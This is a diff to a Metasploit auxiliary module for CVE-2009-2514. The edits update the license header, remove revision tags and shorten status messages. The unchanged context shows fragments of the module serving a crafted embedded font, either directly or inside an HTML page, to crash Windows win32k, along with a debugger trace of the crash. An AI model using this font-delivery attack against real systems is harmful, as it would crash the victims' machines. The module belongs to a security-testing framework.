@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -28,7 +24,6 @@ class Metasploit3 < Msf::Auxiliary
 			},
 			'License'        => MSF_LICENSE,
 			'Author'         => 'hdm',
-			'Version'        => '$Revision$',
 			'References'     =>
 				[
 					[ 'CVE', '2009-2514' ],
@@ -65,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
 			content[cidx + 8, 8] = [ coff, clen ].pack("N*")
 
 			# Send the font on its merry way
-			print_status("Sending embedded font to #{cli.peerhost}:#{cli.peerport}...")
+			print_status("Sending embedded font...")
 			send_response_html(cli, content, { 'Content-Type' => 'application/octet-stream' })
 		else
 			var_title = Rex::Text.rand_text_alpha(6 + rand(32))
@@ -80,7 +75,7 @@ body {
 }
 </style></head><body> #{var_body} </body></html>|
 
-			print_status("Sending HTML page with embedded font to #{cli.peerhost}:#{cli.peerport}...")
+			print_status("Sending HTML page with embedded font...")
 			send_response_html(cli, content, { 'Content-Type' => 'text/html' })
 		end
 	end
@@ -165,4 +160,3 @@ bf87c9d9 0f82cf000000    jb      win32k!bComputeIDs+0x1be (bf87caae)
 bf87c9df 8a6702          mov     ah,byte ptr [edi+2]  <--- the crash above
 
 =end
-
